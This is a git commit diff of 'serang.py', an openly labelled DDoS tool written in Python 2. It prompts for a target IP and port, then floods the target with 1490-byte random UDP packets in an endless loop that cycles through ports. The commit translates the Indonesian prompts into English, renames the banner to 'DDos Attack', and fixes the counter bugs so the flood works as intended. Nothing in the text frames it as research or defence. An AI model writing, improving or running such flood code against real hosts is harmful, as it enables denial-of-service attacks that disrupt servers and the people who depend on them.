d6efb103b1383d40979c44262989035c324e772b
Kyky <66506609+rizkyyz@users.noreply.github.com>
2021-08-10 01:26:34 +0700

    Update serang.py

--- serang.py
+++ serang.py
@@ -1,10 +1,8 @@
-#rizkyyz tools hacking ddos attack
 import sys
 import os
 import time
 import socket
 import random
-
 #Code Time
 from datetime import datetime
 now = datetime.now()
@@ -14,31 +12,29 @@ day = now.day
 month = now.month
 year = now.year
 
-#####################
+##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#####################
+#############
 
 os.system("clear")
-os.system("figlet Kang Down")
+os.system("figlet DDos Attack")
 print
-print  "          ddos webserver from tn-angel    "
-print  "Author     : rizkyyz"
-print  "Youtube    : https://www.youtube.com/channel/UChSMz4axIFiSPW9z-vuvjxA"
-print  "github     : https://github.com/rizkyyz"
-print  "facebook   : https://www.facebook.com/Mrsky"
-print  "Team       : no team "
+print "Author   : Tn.Angel"
+print "You Tube : https://www.youtube.com/c/TN.ANGEL"
+print "github   : https://github.com/rizkyyz"
+print "Facebook : https://www.facebook.com/mrsky"
 print
-ip = raw_input("MASUKIN IP TARGET LU : ")
-port = input("MAUSKIN PORT        :")
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
 
 os.system("clear")
-os.system("figlet  Udah serang masss")
+os.system("figlet Attack Starting")
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
 time.sleep(5)
-print "[==========          ] 50% sabar yeah!!!"
+print "[==========          ] 50%"
 time.sleep(5)
 print "[===============     ] 75%"
 time.sleep(5)
@@ -47,8 +43,8 @@ time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
-     sent = sent = 1
-     port = port = 1
-     print "Mengirim %s Packet ke %s target port:%s"%(sent,ip,port)
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
